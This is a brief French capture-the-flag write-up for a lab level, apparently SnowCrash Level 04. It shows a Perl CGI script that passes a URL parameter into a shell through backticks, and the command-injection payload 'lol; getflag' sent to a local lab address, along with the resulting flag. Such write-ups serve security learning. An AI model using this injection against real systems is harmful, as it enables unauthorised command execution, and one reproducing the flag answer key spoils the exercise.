# Level 04

- Le code
<pre>
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
<strong>  print `echo $y 2>&1`;</strong>
}
print(param);
x(param("x"));
</pre>
- avec la commande on a choisi de faire une injection
```
lol; getflag
```
- On le converti en urlencode et on l'assigne au parametre **x**
 - [http://192.168.99.101:4747/?x=lol%3b%20getflag](http://192.168.99.101:4747/?x=lol%3b%20getflag)
- flag: `ne2searoevaevoem4ov4ar8ap`
